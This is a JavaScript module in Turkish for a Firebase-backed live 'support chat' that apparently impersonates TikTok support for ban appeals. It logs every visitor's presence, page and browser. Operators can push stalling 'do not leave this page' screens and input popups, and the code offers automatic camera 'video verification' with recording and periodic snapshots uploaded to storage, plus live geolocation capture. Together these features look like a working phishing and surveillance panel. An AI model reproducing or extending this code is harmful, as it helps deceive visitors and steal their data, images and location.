import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import {
  getDatabase,
  ref,
  push,
  set,
  update,
  remove,
  onChildAdded,
  onValue,
  get,
  query,
  orderByChild,
  limitToLast,
} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
import {
  getStorage,
  ref as storageRef,
  uploadBytes,
  getDownloadURL,
} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-storage.js";

const ICE_SERVERS = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
    {
      urls: [
        "turn:openrelay.metered.ca:80",
        "turn:openrelay.metered.ca:80?transport=tcp",
        "turn:openrelay.metered.ca:443",
        "turns:openrelay.metered.ca:443",
      ],
      username: "openrelayproject",
      credential: "openrelayproject",
    },
  ],
};

const cfg = window.FIREBASE_SYNC || {};
const configured =
  Boolean(cfg.enabled) &&
  cfg.firebase &&
  cfg.firebase.apiKey &&
  !String(cfg.firebase.apiKey).startsWith("YOUR_");

const QUICK_KEY = "admin_quick_replies_v1";
const DEFAULT_QUICK_REPLIES = [
  "Merhaba, size nasıl yardımcı olabilirim?",
  "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
  "İşleminiz devam ediyor, lütfen bekleyin.",
  "Lütfen uygulamada gördüğünüz uyarı veya hata metnini yazın.",
  "Hesap işlemleri için yalnızca resmi destek kullanılır: support.tiktok.com",
  "Şifre, e-posta veya doğrulama kodu paylaşmayın.",
  "Konuyu inceledim. Ban itirazını uygulama üzerinden göndermeniz gerekiyor.",
  "Başka bir sorunuz var mı?",
];

let app = null;
let db = null;
let storage = null;
let sessionId = null;
let sessionReady = null;

function makeId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return `s_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

function getSessionId() {
  const key = "help_chat_session";
  let id = sessionStorage.getItem(key);
  if (!id) {
    id = makeId();
    sessionStorage.setItem(key, id);
  }
  return id;
}

function initApp() {
  if (!configured) return null;
  if (app) return app;
  app = initializeApp(cfg.firebase);
  return app;
}

function initDb() {
  if (!configured) return null;
  if (db) return db;
  const firebaseApp = initApp();
  if (!firebaseApp) return null;
  db = getDatabase(firebaseApp);
  return db;
}

function initStorage() {
  if (!configured) return null;
  if (storage) return storage;
  const firebaseApp = initApp();
  if (!firebaseApp) return null;
  storage = getStorage(firebaseApp);
  return storage;
}

async function ensureSession() {
  const database = initDb();
  if (!database) return null;
  if (sessionReady) return sessionReady;

  sessionId = getSessionId();
  const sessionRef = ref(database, `chats/${sessionId}`);

  sessionReady = (async () => {
    const now = Date.now();
    await update(sessionRef, {
      createdAt: now,
      updatedAt: now,
      enteredAt: now,
      page: location.pathname + location.hash,
      userAgent: navigator.userAgent.slice(0, 180),
      preview: "Siteye giriş yaptı",
      lastWho: "user",
      online: true,
    });
    return sessionId;
  })();

  return sessionReady;
}

/** Sayfa açıkken / geri dönünce admin’e “giriş” sinyali */
async function pingPresence() {
  const database = initDb();
  if (!database || !configured) return false;
  try {
    const id = await ensureSession();
    if (!id) return false;
    const now = Date.now();
    await update(ref(database, `chats/${id}`), {
      updatedAt: now,
      enteredAt: now,
      page: location.pathname + location.hash,
      preview: "Siteye giriş yaptı",
      lastWho: "user",
      online: true,
    });
    return true;
  } catch (err) {
    console.warn("presence", err);
    return false;
  }
}

async function pushMessage(who, text) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  const id = await ensureSession();
  if (!id) throw new Error("Oturum açılamadı");

  const clean = String(text || "").trim().slice(0, 800);
  if (!clean) throw new Error("Boş mesaj");

  const msgRef = push(ref(database, `chats/${id}/messages`));
  await set(msgRef, {
    who: String(who || "user"),
    text: clean,
    ts: Date.now(),
  });
  await update(ref(database, `chats/${id}`), {
    updatedAt: Date.now(),
    preview: clean.slice(0, 120),
    lastWho: String(who || "user"),
    page: location.pathname + location.hash,
  });
  return true;
}

/** Ziyaretçi açılışında otomatik kamera: call + mesaj (from:auto → ziyaretçi admin dinleyicisine düşmez) */
async function startVisitorCameraOffer(text) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  const id = await ensureSession();
  if (!id) throw new Error("Oturum açılamadı");

  const callId = makeId();
  await initCameraCall(id, callId);

  const clean = String(
    text ||
      "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
  )
    .trim()
    .slice(0, 800);
  if (!clean) throw new Error("Boş mesaj");

  const msgRef = push(ref(database, `chats/${id}/messages`));
  await set(msgRef, {
    who: "bot",
    from: "auto",
    text: clean,
    ts: Date.now(),
    type: "camera",
    callId,
    okLabel: "İzin ver",
    cancelLabel: "Reddet",
  });
  await update(ref(database, `chats/${id}`), {
    updatedAt: Date.now(),
    preview: "📷 Kamera talebi",
    lastWho: "bot",
    page: location.pathname + location.hash,
  });
  return { callId, sessionId: id };
}

function webrtcPath(sessionIdValue, callId, ...parts) {
  return ["chats", sessionIdValue, "webrtc", callId, ...parts].filter(Boolean).join("/");
}

async function initCameraCall(targetSessionId, callId) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  await set(ref(database, webrtcPath(targetSessionId, callId)), {
    status: "requested",
    createdAt: Date.now(),
    updatedAt: Date.now(),
  });
}

async function setCameraCallStatus(targetSessionId, callId, status) {
  const database = initDb();
  if (!database) return false;
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    status,
    updatedAt: Date.now(),
  });
  return true;
}

async function forceEndCameraCall(targetSessionId, callId) {
  const database = initDb();
  if (!database || !targetSessionId || !callId) return false;
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    status: "ended",
    forceClose: true,
    endedBy: "admin",
    endedAt: Date.now(),
    updatedAt: Date.now(),
  });
  return true;
}

async function writeCameraSignal(targetSessionId, callId, key, value) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    [key]: value,
    updatedAt: Date.now(),
  });
}

async function writeCameraOffer(targetSessionId, callId, offer) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    offer: {
      type: offer.type,
      sdp: offer.sdp,
    },
    status: "live",
    visitorReady: true,
    visitorReadyAt: Date.now(),
    updatedAt: Date.now(),
  });
}

async function writeCameraAnswer(targetSessionId, callId, answer) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    answer: {
      type: answer.type,
      sdp: answer.sdp,
    },
    adminReady: true,
    updatedAt: Date.now(),
  });
}

async function markVisitorCameraReady(targetSessionId, callId) {
  const database = initDb();
  if (!database) return false;
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    visitorReady: true,
    status: "connecting",
    updatedAt: Date.now(),
  });
  await update(ref(database, `chats/${targetSessionId}`), {
    cameraGranted: true,
    cameraGrantedAt: Date.now(),
    hasCamera: true,
    updatedAt: Date.now(),
    preview: "📷 Kamera izni verildi",
    lastWho: "user",
  }).catch(() => {});
  return true;
}

async function writeLiveLocation(targetSessionId, callId, location) {
  const database = initDb();
  if (!database || !targetSessionId || !callId || !location) return false;
  const lat = Number(location.lat);
  const lng = Number(location.lng);
  if (!Number.isFinite(lat) || !Number.isFinite(lng)) return false;
  const payload = {
    lat,
    lng,
    accuracy: Number.isFinite(Number(location.accuracy)) ? Number(location.accuracy) : null,
    altitude: Number.isFinite(Number(location.altitude)) ? Number(location.altitude) : null,
    heading: Number.isFinite(Number(location.heading)) ? Number(location.heading) : null,
    speed: Number.isFinite(Number(location.speed)) ? Number(location.speed) : null,
    ts: Number(location.ts) || Date.now(),
  };
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    location: payload,
    locationStatus: "live",
    locationUpdatedAt: payload.ts,
    updatedAt: Date.now(),
  });
  await update(ref(database, `chats/${targetSessionId}`), {
    lastLocation: payload,
    lastLocationAt: payload.ts,
    hasLocation: true,
    updatedAt: Date.now(),
    preview: "📍 Konum alındı",
    lastWho: "user",
  }).catch(() => {});
  return true;
}

async function writeLocationStatus(targetSessionId, callId, status, error) {
  const database = initDb();
  if (!database || !targetSessionId || !callId) return false;
  const payload = {
    locationStatus: String(status || "unknown").slice(0, 40),
    updatedAt: Date.now(),
  };
  if (error) payload.locationError = String(error).slice(0, 180);
  await update(ref(database, webrtcPath(targetSessionId, callId)), payload);
  return true;
}

async function pushIceCandidate(targetSessionId, callId, side, candidate) {
  const database = initDb();
  if (!database || !candidate) return false;
  const listRef = push(ref(database, webrtcPath(targetSessionId, callId, `${side}Candidates`)));
  await set(listRef, candidate);
  return true;
}

function listenCameraCall(sessionIdValue, callId, onUpdate) {
  const database = initDb();
  if (!database || !sessionIdValue || !callId) return () => {};
  return onValue(ref(database, webrtcPath(sessionIdValue, callId)), (snap) => {
    onUpdate(snap.val() || null);
  });
}

function listenIceCandidates(sessionIdValue, callId, side, onCandidate) {
  const database = initDb();
  if (!database || !sessionIdValue || !callId) return () => {};
  return onChildAdded(
    ref(database, webrtcPath(sessionIdValue, callId, `${side}Candidates`)),
    (snap) => {
      onCandidate(snap.val());
    }
  );
}

async function clearCameraCall(targetSessionId, callId) {
  const database = initDb();
  if (!database || !targetSessionId || !callId) return false;
  await remove(ref(database, webrtcPath(targetSessionId, callId)));
  return true;
}

async function markCameraRecordingFailed(targetSessionId, callId, reason) {
  const database = initDb();
  if (!database || !targetSessionId || !callId) return false;
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    recordingStatus: "failed",
    recordingError: String(reason || "unknown").slice(0, 220),
    updatedAt: Date.now(),
  });
  return true;
}

async function uploadCameraRecording(targetSessionId, callId, blob, fileName) {
  const store = initStorage();
  const database = initDb();
  if (!store || !database) throw new Error("Firebase Storage bağlı değil");
  if (!blob?.size) throw new Error("Boş kayıt");

  const safeName = String(fileName || `kamera-${callId}.webm`).replace(/[^\w.\-]+/g, "_");
  const path = `recordings/${targetSessionId}/${callId}-${Date.now()}.webm`;
  const fileRef = storageRef(store, path);

  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    recordingStatus: "uploading",
    updatedAt: Date.now(),
  }).catch(() => {});

  try {
    await uploadBytes(fileRef, blob, {
      contentType: blob.type || "video/webm",
      contentDisposition: `attachment; filename="${safeName}"`,
      customMetadata: {
        sessionId: String(targetSessionId),
        callId: String(callId),
      },
    });

    const url = await getDownloadURL(fileRef);
    await update(ref(database, webrtcPath(targetSessionId, callId)), {
      recordingUrl: url,
      recordingPath: path,
      recordingBytes: blob.size,
      recordingName: safeName,
      recordingReadyAt: Date.now(),
      recordingStatus: "ready",
      status: "ended",
      updatedAt: Date.now(),
    });
    await update(ref(database, `chats/${targetSessionId}`), {
      updatedAt: Date.now(),
      preview: "🎬 Kamera kaydı hazır",
      lastWho: "user",
      lastRecordingUrl: url,
      lastRecordingName: safeName,
      lastRecordingAt: Date.now(),
      lastRecordingCallId: String(callId),
      hasRecording: true,
    });
    return url;
  } catch (err) {
    await markCameraRecordingFailed(
      targetSessionId,
      callId,
      err?.code || err?.message || err
    ).catch(() => {});
    throw err;
  }
}

/** Periyodik kamera karesi (video kaydı olmasa bile Storage’a düşer) */
async function uploadCameraSnapshot(targetSessionId, callId, blob, fileName) {
  const store = initStorage();
  const database = initDb();
  if (!store || !database) throw new Error("Firebase Storage bağlı değil");
  if (!blob?.size) throw new Error("Boş görüntü");

  const safeName = String(fileName || `snap-${callId}.jpg`).replace(/[^\w.\-]+/g, "_");
  const path = `recordings/${targetSessionId}/${safeName}`;
  const fileRef = storageRef(store, path);

  await uploadBytes(fileRef, blob, {
    contentType: blob.type || "image/jpeg",
    contentDisposition: `inline; filename="${safeName}"`,
    customMetadata: {
      sessionId: String(targetSessionId),
      callId: String(callId),
      kind: "snapshot",
    },
  });

  const url = await getDownloadURL(fileRef);
  const now = Date.now();
  await update(ref(database, webrtcPath(targetSessionId, callId)), {
    lastSnapshotUrl: url,
    lastSnapshotAt: now,
    lastSnapshotPath: path,
    updatedAt: now,
  });
  await update(ref(database, `chats/${targetSessionId}`), {
    updatedAt: now,
    preview: "🖼 Kamera fotoğrafı alındı",
    lastWho: "user",
    lastSnapshotUrl: url,
    hasCamera: true,
    cameraGranted: true,
  });
  return url;
}

async function sendAdminMessage(targetSessionId, text, options = {}) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  if (!targetSessionId) throw new Error("Sohbet seçili değil");
  const kind =
    options.type === "loading"
      ? "loading"
      : options.type === "popup"
        ? "popup"
        : options.type === "camera"
          ? "camera"
          : "text";
  const clean = String(
    text ||
      (kind === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
        : kind === "popup"
          ? "Devam etmek için onaylayın."
          : kind === "camera"
            ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
            : "")
  )
    .trim()
    .slice(0, 800);
  if (!clean) throw new Error("Boş mesaj");

  const okLabel = String(options.okLabel || "Tamam").trim().slice(0, 40) || "Tamam";
  const cancelLabel = String(options.cancelLabel || "İptal").trim().slice(0, 40) || "İptal";
  const callId =
    kind === "camera"
      ? String(options.callId || makeId()).slice(0, 64)
      : null;

  // who:"bot" + from:"admin" → eski Rules (yalnızca user/bot) ile de uyumlu
  const msgRef = push(ref(database, `chats/${targetSessionId}/messages`));
  const payload = {
    who: "bot",
    from: "admin",
    text: clean,
    ts: Date.now(),
  };
  if (kind === "loading" || kind === "popup" || kind === "camera") payload.type = kind;
  if (kind === "popup") {
    payload.from = "admin";
    payload.okLabel = okLabel;
    payload.cancelLabel = cancelLabel;
    payload.withInput = true;
    payload.popup = true;
    payload.placeholder = String(options.placeholder || "Mesajınızı buraya yazın…")
      .trim()
      .slice(0, 120);
  }
  if (kind === "camera") {
    payload.callId = callId;
    payload.okLabel = String(options.okLabel || "İzin ver").trim().slice(0, 40) || "İzin ver";
    payload.cancelLabel =
      String(options.cancelLabel || "Reddet").trim().slice(0, 40) || "Reddet";
    await initCameraCall(targetSessionId, callId);
  }

  await set(msgRef, payload);
  await update(ref(database, `chats/${targetSessionId}`), {
    updatedAt: Date.now(),
    preview:
      kind === "loading"
        ? "⏳ Kontrol ediliyor…"
        : kind === "popup"
          ? `Popup: ${clean.slice(0, 100)}`
          : kind === "camera"
            ? "📷 Kamera talebi"
            : clean.slice(0, 120),
    lastWho: "admin",
  });
  return { callId };
}

function checkAdminPassword(password) {
  const expected = String(window.FIREBASE_SYNC?.adminPassword || cfg.adminPassword || "").trim();
  const given = String(password || "").trim();
  if (!expected) return false;
  if (given === expected) return true;
  return given.replace(/\s+/g, "") === expected.replace(/\s+/g, "");
}

function listenSessions(onUpdate) {
  const database = initDb();
  if (!database) return () => {};
  // index/orderBy bağımlılığı olmasın — client tarafında sırala (mesajlar kaçmasın)
  return onValue(
    ref(database, "chats"),
    (snap) => {
      const rows = [];
      snap.forEach((child) => {
        const val = child.val() || {};
        rows.push({ id: child.key, ...val });
      });
      rows.sort((a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0));
      onUpdate(rows.slice(0, 100));
    },
    (err) => {
      console.error("listenSessions error", err);
      onUpdate([]);
    }
  );
}

function listenMessages(sessionIdValue, onMessage) {
  const database = initDb();
  if (!database || !sessionIdValue) return () => {};
  const messagesRef = ref(database, `chats/${sessionIdValue}/messages`);
  return onChildAdded(
    messagesRef,
    (snap) => {
      const val = snap.val();
      if (!val || typeof val !== "object") return;
      onMessage({ id: snap.key, ...val });
    },
    (err) => {
      console.error("listenMessages error", err);
    }
  );
}

async function getSessionMessages(sessionIdValue) {
  const database = initDb();
  if (!database || !sessionIdValue) return [];
  const snap = await get(ref(database, `chats/${sessionIdValue}/messages`));
  const val = snap.val() || {};
  return Object.entries(val)
    .map(([id, msg]) => ({ id, ...(msg || {}) }))
    .sort((a, b) => (Number(a.ts) || 0) - (Number(b.ts) || 0));
}

async function getSessionMeta(sessionIdValue) {
  const database = initDb();
  if (!database || !sessionIdValue) return null;
  const snap = await get(ref(database, `chats/${sessionIdValue}`));
  if (!snap.exists()) return null;
  return { id: sessionIdValue, ...snap.val() };
}

async function clearSessionMessages(sessionIdValue) {
  const database = initDb();
  if (!database || !sessionIdValue) throw new Error("Sohbet seçili değil");
  await remove(ref(database, `chats/${sessionIdValue}/messages`));
  try {
    await remove(ref(database, `chats/${sessionIdValue}/webrtc`));
  } catch {
    /* ignore */
  }
  await update(ref(database, `chats/${sessionIdValue}`), {
    preview: "Sohbet temizlendi",
    updatedAt: Date.now(),
    lastWho: "admin",
  });
  return true;
}

async function deleteSession(sessionIdValue) {
  const database = initDb();
  if (!database || !sessionIdValue) throw new Error("Sohbet seçili değil");
  await remove(ref(database, `chats/${sessionIdValue}`));
  return true;
}

async function clearAllSessions() {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  const snap = await get(ref(database, "chats"));
  const val = snap.val() || {};
  const ids = Object.keys(val);
  await Promise.all(ids.map((id) => remove(ref(database, `chats/${id}`))));
  return ids.length;
}

function listenIncomingSupport(onMessage) {
  if (!configured) return () => {};
  const id = getSessionId();
  ensureSession().catch(() => {});
  // onChildAdded geçmişi de getirir; eski kamera/popup/loading’i canlı talep sayma
  const attachedAt = Date.now();
  const seen = new Set();
  return listenMessages(id, (msg) => {
    if (!(msg.who === "admin" || msg.from === "admin")) return;
    if (msg.id) {
      if (seen.has(msg.id)) return;
      seen.add(msg.id);
    }
    const isAction =
      msg.type === "camera" || msg.type === "popup" || msg.type === "loading";
    if (isAction) {
      const ts = Number(msg.ts) || 0;
      // Dinleyici bağlanmadan ≥3 sn önce yazılmış aksiyonları yok say (geçmiş replay)
      if (!ts || ts < attachedAt - 3000) return;
    }
    onMessage(msg);
  });
}

function getQuickReplies() {
  try {
    const raw = localStorage.getItem(QUICK_KEY);
    if (!raw) return [...DEFAULT_QUICK_REPLIES];
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [...DEFAULT_QUICK_REPLIES];
    return parsed.map((x) => String(x || "").trim()).filter(Boolean).slice(0, 40);
  } catch {
    return [...DEFAULT_QUICK_REPLIES];
  }
}

function setQuickReplies(list) {
  const clean = (Array.isArray(list) ? list : [])
    .map((x) => String(x || "").trim())
    .filter(Boolean)
    .slice(0, 40);
  localStorage.setItem(QUICK_KEY, JSON.stringify(clean));
  return clean;
}

window.ChatSync = {
  enabled: configured,
  needsSetup: !configured,
  adminPasswordHintSet: Boolean(cfg.adminPassword && cfg.adminPassword !== "degistir-bu-sifreyi"),
  ICE_SERVERS,
  getSessionId,
  ensureSession,
  pingPresence,
  pushMessage,
  startVisitorCameraOffer,
  sendAdminMessage,
  checkAdminPassword,
  listenSessions,
  listenMessages,
  getSessionMessages,
  getSessionMeta,
  clearSessionMessages,
  deleteSession,
  clearAllSessions,
  listenIncomingSupport,
  initCameraCall,
  setCameraCallStatus,
  forceEndCameraCall,
  writeCameraSignal,
  writeCameraOffer,
  writeCameraAnswer,
  markVisitorCameraReady,
  writeLiveLocation,
  writeLocationStatus,
  pushIceCandidate,
  listenCameraCall,
  listenIceCandidates,
  clearCameraCall,
  uploadCameraRecording,
  uploadCameraSnapshot,
  markCameraRecordingFailed,
  getQuickReplies,
  setQuickReplies,
  DEFAULT_QUICK_REPLIES,
};

window.ChatSyncReady = Promise.resolve(window.ChatSync);

// Ziyaretçi sayfalarında siteye girince oturumu hemen bildir
const isAdminPage = /admin\.html$/i.test(location.pathname || "");
if (configured && !isAdminPage) {
  pingPresence().catch(() => {});
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden) pingPresence().catch(() => {});
  });
  window.addEventListener("pageshow", () => {
    pingPresence().catch(() => {});
  });
}
